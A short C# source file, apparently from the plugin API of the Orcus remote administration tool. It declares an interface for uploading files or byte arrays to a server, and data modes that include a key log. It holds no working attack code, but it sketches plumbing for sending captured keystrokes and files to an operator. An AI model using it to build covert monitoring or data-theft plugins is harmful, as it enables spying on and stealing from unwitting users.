using System;

namespace Orcus.Plugins
{
    /// <summary>
    ///     Can be used to upload files to the server
    /// </summary>
    public interface IDatabaseConnection
    {
        /// <summary>
        ///     Upload file to the server
        /// </summary>
        /// <param name="fileName">The path of the file</param>
        /// <param name="entryName">The name of the entry</param>
        /// <param name="dataMode">The data mode of the file</param>
        void PushFile(string fileName, string entryName, DataMode dataMode);

        /// <summary>
        ///     Upload a byte array to the server
        /// </summary>
        /// <param name="data">The data</param>
        /// <param name="entryName">The name of the entry</param>
        /// <param name="dataMode">The data mode of the file</param>
        void PushFile(byte[] data, string entryName, DataMode dataMode);
    }

    /// <summary>
    ///     Defines the type of a data entry
    /// </summary>
    public class DataMode
    {
        /// <summary>
        ///     Create a new <see cref="DataMode" />
        /// </summary>
        /// <param name="guid">The guid of the data mode</param>
        public DataMode(Guid guid)
        {
            Guid = guid;
        }

        /// <summary>
        ///     The guid of the data mode
        /// </summary>
        public Guid Guid { get; }

        /// <summary>
        ///     The entry is handled as a file
        /// </summary>
        public static DataMode File => new DataMode(new Guid("D8F76901-BE1A-4E09-9C9E-4AB35E089188"));

        /// <summary>
        ///     The entry is handled as a package which contains files
        /// </summary>
        public static DataMode Package => new DataMode(new Guid("76EC1877-89F9-4287-ACCF-706CF6CAD708"));

        /// <summary>
        ///     The entry is handled as a key log
        /// </summary>
        public static DataMode KeyLog => new DataMode(new Guid("E10E9542-F632-4F68-BDF6-F0EF1C9D04D2"));

        /// <summary>
        ///     The entry is handled as a ZIP archive (https://en.wikipedia.org/wiki/Zip_(file_format))
        /// </summary>
        public static DataMode ZipArchive => new DataMode(new Guid("AB98E879-0D92-4BF5-A61A-C61494C1F542"));
    }
}